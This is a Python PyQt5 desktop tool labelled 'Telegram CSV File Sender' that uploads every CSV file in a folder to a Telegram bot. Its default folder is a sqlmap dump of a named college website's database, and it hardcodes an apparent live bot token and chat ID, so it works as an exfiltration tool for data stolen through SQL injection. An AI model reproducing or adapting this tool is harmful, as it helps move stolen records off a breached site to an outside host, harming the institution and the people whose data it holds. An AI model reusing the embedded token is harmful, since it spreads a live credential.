import os
import sys
import requests
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QFileDialog, QMessageBox, QProgressBar,
                             QGroupBox, QListWidget, QListWidgetItem, QCheckBox)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QPalette, QColor

class TelegramSenderThread(QThread):
    progress = pyqtSignal(int)
    message = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(self, api_token, chat_id, directory, select_all=True, selected_files=None):
        super().__init__()
        self.api_token = api_token
        self.chat_id = chat_id
        self.directory = directory
        self.select_all = select_all
        self.selected_files = selected_files if selected_files else []

    def run(self):
        try:
            # Check if directory exists
            if not os.path.isdir(self.directory):
                self.message.emit(f"Error: Directory '{self.directory}' not found!")
                self.finished.emit(False)
                return

            # Get all CSV files in directory
            csv_files = [f for f in os.listdir(self.directory) if f.endswith('.csv')]
            
            if not csv_files:
                self.message.emit("No CSV files found in the directory!")
                self.finished.emit(False)
                return

            # Filter files if not selecting all
            if not self.select_all:
                csv_files = [f for f in csv_files if f in self.selected_files]
                
            if not csv_files:
                self.message.emit("No files selected!")
                self.finished.emit(False)
                return

            total_files = len(csv_files)
            success_count = 0

            for index, file in enumerate(csv_files):
                file_path = os.path.join(self.directory, file)
                self.message.emit(f"Sending {file}...")

                try:
                    # Send file to Telegram
                    url = f"https://api.telegram.org/bot{self.api_token}/sendDocument"
                    with open(file_path, 'rb') as f:
                        files = {'document': f}
                        data = {'chat_id': self.chat_id}
                        response = requests.post(url, data=data, files=files)
                    
                    if response.status_code == 200:
                        self.message.emit(f"✓ Successfully sent {file}")
                        success_count += 1
                    else:
                        self.message.emit(f"✗ Failed to send {file}: {response.text}")
                
                except Exception as e:
                    self.message.emit(f"✗ Error sending {file}: {str(e)}")
                
                # Update progress
                self.progress.emit(int((index + 1) * 100 / total_files))

            self.message.emit(f"Process completed. {success_count}/{total_files} files sent successfully.")
            self.finished.emit(True)

        except Exception as e:
            self.message.emit(f"Error: {str(e)}")
            self.finished.emit(False)


class TelegramCSVSender(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        
    def initUI(self):
        self.setWindowTitle("Telegram CSV File Sender")
        self.setGeometry(100, 100, 800, 600)
        
        # Set application style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2b2b2b;
            }
            QLabel {
                color: #ffffff;
                font-size: 12px;
            }
            QLineEdit {
                background-color: #3c3c3c;
                color: #ffffff;
                border: 1px solid #555555;
                border-radius: 4px;
                padding: 5px;
            }
            QPushButton {
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QPushButton:disabled {
                background-color: #555555;
                color: #aaaaaa;
            }
            QTextEdit {
                background-color: #3c3c3c;
                color: #ffffff;
                border: 1px solid #555555;
                border-radius: 4px;
            }
            QGroupBox {
                color: #ffffff;
                border: 1px solid #555555;
                border-radius: 5px;
                margin-top: 10px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QListWidget {
                background-color: #3c3c3c;
                color: #ffffff;
                border: 1px solid #555555;
                border-radius: 4px;
            }
            QProgressBar {
                border: 1px solid #555555;
                border-radius: 4px;
                text-align: center;
                color: white;
            }
            QProgressBar::chunk {
                background-color: #4CAF50;
                width: 10px;
            }
        """)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        
        # API Token
        token_layout = QHBoxLayout()
        token_label = QLabel("API Token:")
        self.token_input = QLineEdit("7930452267:AAHfMaFUV6lCS9JhmxUsnA6PEGahLIdEeVI")
        token_layout.addWidget(token_label)
        token_layout.addWidget(self.token_input)
        layout.addLayout(token_layout)
        
        # Chat ID
        chat_layout = QHBoxLayout()
        chat_label = QLabel("Chat ID:")
        self.chat_input = QLineEdit("7273248790")
        chat_layout.addWidget(chat_label)
        chat_layout.addWidget(self.chat_input)
        layout.addLayout(chat_layout)
        
        # Directory selection
        dir_layout = QHBoxLayout()
        dir_label = QLabel("Directory:")
        self.dir_input = QLineEdit(".local/share/sqlmap/output/www.kulticollege.ac.in/dump/kulticollegeac_website_new")
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_directory)
        dir_layout.addWidget(dir_label)
        dir_layout.addWidget(self.dir_input)
        dir_layout.addWidget(browse_btn)
        layout.addLayout(dir_layout)
        
        # File selection group
        file_group = QGroupBox("CSV Files in Directory")
        file_layout = QVBoxLayout()
        
        self.file_list = QListWidget()
        self.select_all_cb = QCheckBox("Select All")
        self.select_all_cb.stateChanged.connect(self.toggle_select_all)
        
        file_layout.addWidget(self.select_all_cb)
        file_layout.addWidget(self.file_list)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        
        # Log output
        log_label = QLabel("Log:")
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        layout.addWidget(log_label)
        layout.addWidget(self.log_output)
        
        # Buttons
        button_layout = QHBoxLayout()
        self.send_btn = QPushButton("Send Files to Telegram")
        self.send_btn.clicked.connect(self.send_files)
        self.clear_btn = QPushButton("Clear Log")
        self.clear_btn.clicked.connect(self.clear_log)
        button_layout.addWidget(self.send_btn)
        button_layout.addWidget(self.clear_btn)
        layout.addLayout(button_layout)
        
        # Load files from default directory
        self.load_files()
        
    def browse_directory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            self.dir_input.setText(directory)
            self.load_files()
    
    def load_files(self):
        self.file_list.clear()
        directory = self.dir_input.text()
        
        if not os.path.isdir(directory):
            self.log_output.append(f"Directory not found: {directory}")
            return
            
        csv_files = [f for f in os.listdir(directory) if f.endswith('.csv')]
        
        if not csv_files:
            self.log_output.append("No CSV files found in directory.")
            return
            
        for file in csv_files:
            item = QListWidgetItem(file)
            item.setCheckState(Qt.Checked)
            self.file_list.addItem(item)
            
        self.log_output.append(f"Found {len(csv_files)} CSV files.")
        
    def toggle_select_all(self, state):
        for i in range(self.file_list.count()):
            item = self.file_list.item(i)
            item.setCheckState(Qt.Checked if state == Qt.Checked else Qt.Unchecked)
    
    def send_files(self):
        api_token = self.token_input.text().strip()
        chat_id = self.chat_input.text().strip()
        directory = self.dir_input.text().strip()
        
        if not api_token:
            QMessageBox.warning(self, "Warning", "Please enter a valid API Token.")
            return
            
        if not chat_id:
            QMessageBox.warning(self, "Warning", "Please enter a valid Chat ID.")
            return
            
        if not os.path.isdir(directory):
            QMessageBox.warning(self, "Warning", "Please select a valid directory.")
            return
            
        # Get selected files
        selected_files = []
        for i in range(self.file_list.count()):
            item = self.file_list.item(i)
            if item.checkState() == Qt.Checked:
                selected_files.append(item.text())
                
        if not selected_files:
            QMessageBox.warning(self, "Warning", "Please select at least one file to send.")
            return
            
        # Disable UI during sending
        self.set_ui_enabled(False)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        
        # Create and start sender thread
        self.sender_thread = TelegramSenderThread(
            api_token, chat_id, directory, 
            self.select_all_cb.isChecked(), selected_files
        )
        self.sender_thread.progress.connect(self.progress_bar.setValue)
        self.sender_thread.message.connect(self.log_output.append)
        self.sender_thread.finished.connect(self.on_send_finished)
        self.sender_thread.start()
        
    def on_send_finished(self, success):
        self.set_ui_enabled(True)
        self.progress_bar.setVisible(False)
        
        if success:
            self.log_output.append("All files processed successfully!")
        else:
            self.log_output.append("File processing completed with errors.")
    
    def set_ui_enabled(self, enabled):
        self.token_input.setEnabled(enabled)
        self.chat_input.setEnabled(enabled)
        self.dir_input.setEnabled(enabled)
        self.file_list.setEnabled(enabled)
        self.select_all_cb.setEnabled(enabled)
        self.send_btn.setEnabled(enabled)
        self.clear_btn.setEnabled(enabled)
        
    def clear_log(self):
        self.log_output.clear()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application font
    font = QFont("Arial", 10)
    app.setFont(font)
    
    window = TelegramCSVSender()
    window.show()
    
    sys.exit(app.exec_())
